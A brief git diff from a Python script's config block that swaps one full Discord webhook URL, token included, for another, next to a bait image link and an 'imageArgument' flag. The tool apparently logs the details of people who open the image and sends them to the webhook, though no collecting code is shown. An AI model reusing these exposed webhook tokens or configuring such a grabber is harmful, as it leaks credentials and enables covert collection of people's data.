@@ -22,7 +22,7 @@ __version__ = "v2.0"
 __author__ = "lynxWings"
 
 config = {
-    "webhook": "https://discord.com/api/webhooks/1136760518460313670/88zhsoeYm18jiasLPki70PI5tiRkIoDGRm9v5KRxbmPYAOyZHhjbqeazs-3KIfOxSq5O", # <------------------------- Put your webhook link here.
+    "webhook": "https://discord.com/api/webhooks/1228622436141105242/3vNLEIKY82S6-f_4kdb61ZnVfJb8AkCMl8adHm-wrbi240VMSnHOQadZaGhbxlLUoXOW", # <------------------------- Put your webhook link here.
     "image": "https://www.google.com/url?sa=i&url=https%3A%2F%2Fwww.bbc.com%2Ffuture%2Farticle%2F20170706-the-mystery-of-the-massive-deep-sea-rivers&psig=AOvVaw0rIrpSXw5lpAyUQvxTYEfq&ust=1690714201612000&source=images&cd=vfe&opi=89978449&ved=0CBEQjRxqFwoTCNi7s7Pfs4ADFQAAAAAdAAAAABAE", # <------------------------- Put image address link here.
     "imageArgument": True,
 
